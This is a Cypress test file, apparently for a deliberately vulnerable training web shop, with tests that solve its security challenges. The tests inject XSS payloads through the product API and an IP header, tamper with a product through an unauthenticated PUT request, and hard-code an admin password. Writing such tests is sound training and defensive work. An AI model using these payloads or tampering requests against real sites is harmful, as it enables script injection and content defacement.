describe('/api', () => {
  describe('challenge "restfulXss"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'R4nd0m-Capybara-7!Quartz' })
    })

    // Cypress alert bug
    // The challenge also passes but its just that cypress freezes and is unable to perform any action
    xit('should be possible to create a new product when logged in', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/api/Products`,
              {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                  'Content-type': 'application/json',
                  Authorization: `Bearer ${localStorage.getItem('token')}`
                },
                body: JSON.stringify({
                  name: 'RestXSS',
                  description: '<iframe src="javascript:alert(`xss`)">',
                  price: 47.11
                })
              }
            )
            if (response.status === 200) {
              console.log('Success')
            }
          })

          cy.visit('/#/search?q=RestXSS')
          cy.reload()
          cy.get('img[alt="RestXSS"]').click()

          cy.on('window:alert', (t) => {
            expect(t).to.equal('xss')
          })

          cy.expectChallengeSolved({ challenge: 'API-only XSS' })
        }
      })
    })
  })

  describe('challenge "changeProduct"', () => {
    it('should be possible to change product via PUT request without being logged in', () => {
      cy.task<number>('GetTamperingProductId').then((tamperingProductId: number) => {
        cy.task<string>('GetOverwriteUrl').then((overwriteUrl: string) => {
          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/api/Products/${tamperingProductId}`,
              {
                method: 'PUT',
                cache: 'no-cache',
                headers: {
                  'Content-type': 'application/json'
                },
                body: JSON.stringify({
                  description: `<a href="${overwriteUrl}" target="_blank">More...</a>`
                })
              }
            )
            assert.equal(response.status, 200)
          })

          cy.visit('/#/search')
        })
      })
      cy.expectChallengeSolved({ challenge: 'Product Tampering' })
    })
  })
})

describe('/rest/saveLoginIp', () => {
  describe('HTTP header validation', () => {
    beforeEach(() => {
      cy.login({
        email: 'admin',
        password: 'R4nd0m-Capybara-7!Quartz'
      })
    })

    it('should fall back to the connection IP for a non-IP header value', () => {
      const payload = '<iframe src="javascript:alert(1)">'
      cy.window().then((win) => {
        return cy.request({
          method: 'GET',
          url: '/rest/saveLoginIp',
          headers: {
            Authorization: `Bearer ${win.localStorage.getItem('token')}`,
            'True-Client-IP': payload
          }
        }).then((response) => {
          expect(response.status).to.equal(200)
          expect(response.body.lastLoginIp).not.to.equal(payload)
          expect(response.body.lastLoginIp).to.match(/^(?:\d{1,3}\.){3}\d{1,3}$|^[0-9a-f:]+$/i)
        })
      })
    })
  })

  it('should not be possible to save log-in IP when not logged in', () => {
    cy.request({ url: '/rest/saveLoginIp', failOnStatusCode: false }).then(
      (response) => {
        console.log(response.body)
        expect(response.body).to.equal('Unauthorized')
      }
    )
  })
})
